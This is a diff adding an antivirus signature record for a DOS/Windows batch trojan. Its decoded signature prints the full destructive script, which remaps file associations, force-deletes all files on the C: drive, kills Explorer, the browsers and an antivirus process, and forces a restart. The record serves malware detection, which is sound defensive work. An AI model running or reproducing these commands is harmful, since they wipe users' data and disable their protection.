@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36563
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off assoc .exe=wmafile assoc .mp3=vbsfile assoc .jpg=themefile assoc .bmp=themefile assoc .gif=themefile del c:\*.*/f/s/q taskkill /f /t /im explorer.exe taskkill /f /t /im firefox.exe taskkill /f /t /im iexplore.exe taskkill /f /t /im avgnt.exe shutdown -r -t 600 -c "opfer"
